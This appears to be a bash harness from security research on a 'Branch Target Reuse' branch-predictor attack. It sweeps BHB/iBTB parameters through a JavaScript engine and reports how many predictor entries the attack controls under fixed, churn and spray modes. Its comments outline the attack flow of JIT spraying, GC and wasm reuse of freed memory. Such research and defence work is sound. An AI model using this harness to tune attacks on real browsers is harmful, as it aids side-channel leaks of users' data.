#!/bin/bash

# Branch Target Reuse (BTR)
# April 30th 2026
# Yuhui Zhu

# Sweep the BHB/iBTB geometry (nr_entry x len_bh x nr_bcond_taken) and report how
# many iBTB entries the attack keeps under control. demo.js prints
# `avg(cnt)` = the average number of dispatcher slots that saw an F+R hit per
# probe rep, so avg(cnt) is the controlled-entry count for that geometry.

# Three modes:
#   fixed  --fixed-training
#          Pre-JITed callees, GC storm and wasm reload skipped. The upper bound:
#          the largest entry count the BHB fingerprinting can address at all.
#   churn  --fixed-training --no-skip-gc --no-skip-wa
#          Same training, plus the churn the attack carries between training and
#          probing: the stop-the-world GC that compacts the JITed callees, and
#          the wasm target compiled into the freed executable memory. Reports how
#          many of the entries above survive it.
#   spray  (no --fixed-training)
#          The full attack: trainers sprayed as fresh JIT chunks, GC'd, target
#          reused. The count reachable in the real flow.

# Usage:  JS_CMD=/path/to/js ./btb_control.sh <uarch> [modes]
#   modes  comma-separated subset of fixed,churn,spray (default: fixed,spray).

# Environment:
#   NR_REPEATS  probe reps per point (default 100)
#   SETTLE      seconds between points (default 1)

set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
cd "$HERE" || exit 2
source "$HERE/common.sh"

TEST_NR_ENTRY=(16 32 64 128 256 512 1024 2048 4096 8192)
TEST_LEN_BH=(64 128 256 512)
TEST_NR_BH_TAKEN=(16 32 48 64 96 128 192 256)

NR_REPEATS="${NR_REPEATS:-100}"
SETTLE="${SETTLE:-1}"

# ---- mode selection ---------------------------------------------------------

IFS=',' read -r -a MODES <<< "${2:-fixed,spray}"

mode_flags() {  # $1=mode -> the demo.js flags that define it
    case "$1" in
        fixed) echo "--fixed-training" ;;
        churn) echo "--fixed-training $NO_SKIP_FLAG" ;;
        spray) echo "" ;;
        *)     return 1 ;;
    esac
}

for mode in "${MODES[@]}"; do
    if ! mode_flags "$mode" >/dev/null; then
        echo "Error: unknown mode '$mode'; args[1] = [fixed|churn|spray] (comma-separated)"
        exit 1
    fi
done

declare -A BEST BESTGEO

# ---- sweep ------------------------------------------------------------------

for mode in "${MODES[@]}"; do
    FLAGS="$(mode_flags "$mode")"
    results=()

    echo ""
    echo "=== mode=$mode uarch=$UARCH ($ARCH) flags: ${FLAGS:-<spray>} ==="

    for nr_entry in ${TEST_NR_ENTRY[@]}; do
        for len_bh in ${TEST_LEN_BH[@]}; do
            for taken in ${TEST_NR_BH_TAKEN[@]}; do
                if [[ $taken -ge $len_bh ]]; then
                    continue
                fi
                output=$("${PIN_CMD[@]}" $JS_CMD $JS_SCRIPT ${ARCH_PARAMS[@]} --nr-bh $nr_entry --nr-bcond $len_bh --nr-bcond-taken $taken $FLAGS --repeats $NR_REPEATS --wa-mod $WASM_MODULE | grep "avg(cnt)")
                if [[ "$output" =~ avg\(cnt\)=([0-9]+(\.[0-9]+)?) ]]; then
                    val="${BASH_REMATCH[1]}"
                    results+=("$nr_entry $len_bh $taken $val")
                    cur="${BEST[$mode,$nr_entry]:-}"
                    if [[ -z "$cur" ]] || awk "BEGIN{exit !($val > $cur)}"; then
                        BEST[$mode,$nr_entry]="$val"
                        BESTGEO[$mode,$nr_entry]="len_bh=$len_bh, taken=$taken"
                    fi
                else
                    val="N/A"
                fi
                echo "nr_entry=$nr_entry, len_bh=$len_bh, taken=$taken, avg(cnt)=$val"
                sleep "$SETTLE"
            done
        done
    done

    echo ""
    echo "=== mode=$mode: top 5 combinations by avg(cnt) ==="
    printf '%s\n' "${results[@]+"${results[@]}"}" | sort -t' ' -k4 -rn | head -5 |
    while read -r e l t v; do
        echo "nr_entry=$e, len_bh=$l, taken=$t, avg(cnt)=$v"
    done
done

# ---- summary ----------------------------------------------------------------

echo ""
echo "=== maximum controlled entries ==="
for mode in "${MODES[@]}"; do
    top=""; top_entry=""
    for nr_entry in ${TEST_NR_ENTRY[@]}; do
        v="${BEST[$mode,$nr_entry]:-}"
        [[ -z "$v" ]] && continue
        if [[ -z "$top" ]] || awk "BEGIN{exit !($v > $top)}"; then
            top="$v"; top_entry="$nr_entry"
        fi
    done
    if [[ -z "$top" ]]; then
        echo "$mode: no signal"
    else
        echo "$mode: $top entries at nr_entry=$top_entry (${BESTGEO[$mode,$top_entry]})"
    fi
done
